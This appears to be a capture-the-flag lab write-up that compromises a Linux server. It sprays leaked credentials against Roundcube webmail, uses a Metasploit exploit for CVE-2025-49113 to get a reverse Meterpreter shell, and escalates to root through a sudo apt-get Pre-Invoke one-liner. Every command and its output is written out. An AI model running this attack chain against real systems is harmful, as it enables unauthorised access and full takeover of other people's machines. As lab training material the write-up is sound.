---
source: Hack Smarter
title: Aftermath
difficulty: easy
tags: Roundcube, Metasploit, Sudo Abuse
summary: A vulnerable Roundcube instance allows authenticated users to establish a remote connection via CVE-2025-49113 (Post‑Auth Remote Code Execution in Roundcube via PHP Object Deserialization). Sudo privileges can then be abused to achieve a root shell.
---
>Objective
You have been assigned a penetration test against a Linux server in the client's network. Your objective is to gain root access. The client has planted three flags on the system, retrieving each of these flags demonstrates impact.

>Initial Access
Another team member pulled down a list of names and passwords from DeHashed... but are unsure if any of them are valid.

## [01] Port Scan and Service Discovery

```term
$ sudo nmap -p- -sC -sV -vv -oN scans/nmap_all_tcp.txt 10.1.181.116

PORT   STATE SERVICE REASON         VERSION
??22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
??25/tcp open  smtp    syn-ack ttl 62 Postfix smtpd
|_smtp-commands: kali, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, 
??80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Home
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
```

## [02] SMTP User Enumeration

A teammate was able to grab compromised credentials from `DeHashed`, our first step should be to confirm the validity of these. We can first test for users via `smtp-user-enum` to narrow our list of users to valid smtp users.
```term
$ smtp-user-enum -M VRFY -U names.txt -t 10.1.181.116              

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... names.txt
Target count ............. 1
??Username count ........... 499
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Thu Sep 10 23:39:27 2026 #########
!!10.1.12.125: maria exists
!!10.1.12.125: kali exists
######## Scan completed at Thu Sep 10 23:39:41 2026 #########
2 results.

499 queries in 14 seconds (35.6 queries / sec)
```

With a total of 499 users and we get 2 hits, this significantly narrows our focus and is much easier to spray the compromised passwords. We have smtp, but we also got a webserver from nmap. Let's see if there is a place on the web to use these credentials.


## [03] Discovering Roundcube and CVE-2025-49113

Especially on webservers, I like to have enumeration running in the background as I manually inspect the site. Using `ffuf` we can find directories on the site.

```term
$ ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.1.181.116/FUZZ -ac -c


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.1.181.116/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
!!roundcube               [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 33ms]
:: Progress: [220559/220559] :: Job [1/1] :: 1000 req/sec :: Duration: [0:03:07] :: Errors: 0 ::
```

We get a hit on `roundcube`. Per `https://roundcube.net/`, we get the following:
>Roundcube webmail...
>...is a browser-based multilingual IMAP client with an application-like user interface. It provides full functionality you expect from an email client, including MIME support, address book, folder manipulation, message searching and spell checking.

We can find the version on the /roundcube/ endpoint in the source code:
```term
---snip---
var rcmail = new rcube_webmail();
rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_US","devel_mode":null,
!!"rcversion":10509,
"cookie_domain":"","cookie_path":"/","cookie_secure":false,"dark_mode_support":true,"skin":"elastic","blankpage":"skins/elastic/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":"./?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","request_token":"nJqhjxJCSS6gZVIjNeqYU8bPLQnS8PyH"});
rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","uploading":"Uploading file...","close":"Close","save":"Save","cancel":"Cancel","alerttitle":"Attention","confirmationtitle":"Are you sure...","delete":"Delete","continue":"Continue","ok":"OK","back":"Back","errortitle":"An error occurred!","options":"Options","plaintoggle":"Plain text","htmltoggle":"HTML","previous":"Previous","next":"Next","select":"Select","browse":"Browse","choosefile":"Choose file...","choosefiles":"Choose files..."});
rcmail.gui_container("loginfooter","login-footer");rcmail.gui_object('loginform', 'login-form');
rcmail.gui_object('message', 'messagestack');
---snip---
```


rcversion:10509 maps to Roundcube 1.5.9 which is vulnerable to `CVE-2025-49113`. The CVE exploit requires valid credentials. We have credentials to try against the login form, however, Roundcube will rate limit us. There is a python script here:
> https://github.com/robotshell/cubeSpraying
that helps bypass this rate limit. Using the script and our users enumerated from `smtp-user-enum`, we get a set of credentials:

```term
$ python3 /opt/cubeSpraying/cubeSpraying.py --url 'http://10.1.181.116/roundcube/' -U maria -P passwords.txt --verbose                                                      

---snip---
??*************************************************
!![SUCCESS] Valid credentials found: maria:xxxxxxxx
??*************************************************
---snip---
```

## [04] Shell as "www-data"

Using `metasploit` we can load the CVE-2025-49113 exploit, configure, and fire.

```term
??msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set RHOSTS 10.1.181.116
!!RHOSTS => 10.1.181.116
??msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set TARGETURI /roundcube/
!!TARGETURI => /roundcube/
??msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set USERNAME maria
!!USERNAME => maria
??msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set PASSWORD xxxxxxxx 
!!PASSWORD => xxxxxxxx 
??msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set LHOST tun0
!!LHOST => 10.200.93.113
??msf exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > run
[*] Started reverse TCP handler on 10.200.93.113:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Extracted version: 10509
[+] The target appears to be vulnerable. The target is running a vulnerable version
[*] Fetching CSRF token...
[+] Extracted token: ZVb7h8eBRfDsUwR1IC2EiLYGGkZEJcNZ
[*] Attempting login...
[+] Login successful.
[*] Preparing payload...
[+] Payload successfully generated and serialized.
[*] Uploading malicious payload...
[+] Exploit attempt complete. Check for session.
[*] Sending stage (3090404 bytes) to 10.1.181.116
[*] Meterpreter session 1 opened (10.200.93.113:4444 -> 10.1.181.116:42224) at 2026-09-11 01:03:29 -0500

??meterpreter > shell
Process 1725 created.
Channel 1 created.
??whoami
!!www-data
```

## [05] Privilege Escalation via "sudo apt-get"

Checking sudo privileges for www-data reveals the following:

```term
$ sudo -l
Matching Defaults entries for www-data on kali:

    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on kali:
!!    (ALL) NOPASSWD: /usr/bin/apt-get
```

This can be exploited easily as it's a known gtfobin.
> https://gtfobins.org/gtfobins/apt-get/

```term
$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

whoami
!!root
```
